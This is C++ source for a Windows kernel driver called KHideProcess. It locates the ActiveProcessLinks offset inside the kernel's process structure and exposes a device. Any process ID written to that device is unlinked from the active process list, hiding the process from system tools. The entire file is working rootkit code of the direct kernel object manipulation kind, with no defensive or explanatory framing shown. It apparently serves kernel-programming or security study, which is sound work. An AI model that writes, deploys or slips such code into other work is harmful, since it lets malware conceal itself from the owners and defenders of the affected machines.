#include <ntifs.h>

ULONG_PTR GetActiveProcessLinks() {
	static ULONG_PTR activeProcesLinks = 0;
	if (activeProcesLinks == 0) {
		auto proc = PsInitialSystemProcess;
		auto pid = PsGetProcessId(proc);
		for (int i = 0; i < 0x800; i += sizeof(PVOID)) {
			auto p = (char*)proc + i;
			if (pid == *(HANDLE*)p) {
				auto entry = (PLIST_ENTRY)(p + sizeof(HANDLE));
				if (entry->Flink->Blink == entry) {
					activeProcesLinks = i + sizeof(HANDLE);
					break;
				}
			}
		}
	}
	return activeProcesLinks;
}

void OnUnload(PDRIVER_OBJECT DriverObject) {
	UNICODE_STRING sym = RTL_CONSTANT_STRING(L"\\??\\KHideProcess");
	IoDeleteSymbolicLink(&sym);
	IoDeleteDevice(DriverObject->DeviceObject);
}

NTSTATUS HideProcess(ULONG pid) {
	PEPROCESS process;
	auto status = PsLookupProcessByProcessId(ULongToHandle(pid), &process);
	if (!NT_SUCCESS(status))
		return status;

	// hide!
	LIST_ENTRY* entry = (LIST_ENTRY*)((char*)process + GetActiveProcessLinks());
	RemoveEntryList(entry);
	entry->Blink = entry->Flink = nullptr;

	ObDereferenceObject(process);
	return STATUS_SUCCESS;
}

NTSTATUS OnCreateClose(PDEVICE_OBJECT, PIRP Irp) {
	Irp->IoStatus.Status = STATUS_SUCCESS;
	Irp->IoStatus.Information = 0;
	IoCompleteRequest(Irp, 0);
	return STATUS_SUCCESS;
}

NTSTATUS OnWrite(PDEVICE_OBJECT, PIRP Irp) {
	auto irpSp = IoGetCurrentIrpStackLocation(Irp);
	auto status = STATUS_SUCCESS;
	do {
		if (irpSp->Parameters.Write.Length < sizeof(ULONG)) {
			status = STATUS_BUFFER_TOO_SMALL;
			break;
		}

		auto pid = *(ULONG*)Irp->UserBuffer;
		status = HideProcess(pid);
	} while (false);

	Irp->IoStatus.Status = status;
	Irp->IoStatus.Information = 0;
	IoCompleteRequest(Irp, 0);
	return status;
}


extern "C" NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING) {
	auto offset = GetActiveProcessLinks();
	DbgPrint("ActiveProcessLinks: 0x%llX\n", offset);
	if (offset == 0)
		return STATUS_UNSUCCESSFUL;

	PDEVICE_OBJECT devObj;
	UNICODE_STRING name = RTL_CONSTANT_STRING(L"\\Device\\KHideProcess");
	auto status = IoCreateDevice(DriverObject, 0, &name, FILE_DEVICE_UNKNOWN,
		0, FALSE, &devObj);
	if (!NT_SUCCESS(status))
		return status;

	UNICODE_STRING sym = RTL_CONSTANT_STRING(L"\\??\\KHideProcess");
	status = IoCreateSymbolicLink(&sym, &name);
	if (!NT_SUCCESS(status))
		return status;

	DriverObject->DriverUnload = OnUnload;
	DriverObject->MajorFunction[IRP_MJ_CREATE] = DriverObject->MajorFunction[IRP_MJ_CLOSE] = OnCreateClose;
	DriverObject->MajorFunction[IRP_MJ_WRITE] = OnWrite;

	return STATUS_SUCCESS;
}
